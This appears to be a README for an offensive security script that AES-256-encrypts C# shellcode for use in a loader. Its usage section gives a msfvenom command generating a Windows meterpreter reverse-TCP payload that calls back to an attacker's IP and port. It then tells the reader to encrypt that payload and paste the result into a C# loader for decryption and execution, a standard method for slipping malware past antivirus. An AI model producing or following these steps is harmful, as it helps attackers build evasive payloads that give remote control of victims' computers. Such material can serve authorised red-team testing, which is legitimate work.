## AES256enc.py – AES-256 Encryption 
This script encrypts **C# shellcode** using **AES-256 in CBC mode**, ensuring payload confidentiality.  

### Output Format:  
- **AES Key** – Generated AES key in `xx-xx` format for C# integration.  
- **IV (Initialization Vector)** – IV in `xx-xx` format for CBC decryption.  
- **Encrypted Shellcode** – Ready-to-use byte array for C# execution.  

### Installation & Dependencies  
```bash
sudo apt update  
sudo apt install python3-pycryptodome
```

### Usage
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f csharp
```
-  Copy the byte array inside {} from msfvenom output.
Paste it into buf in AES256enc.py.
- run either python script.
```bash
python3 aes256.enc.py
```
Copy the Generated Key, IV, and Encrypted Shellcode and paste them into your C# loader for decryption and execution.
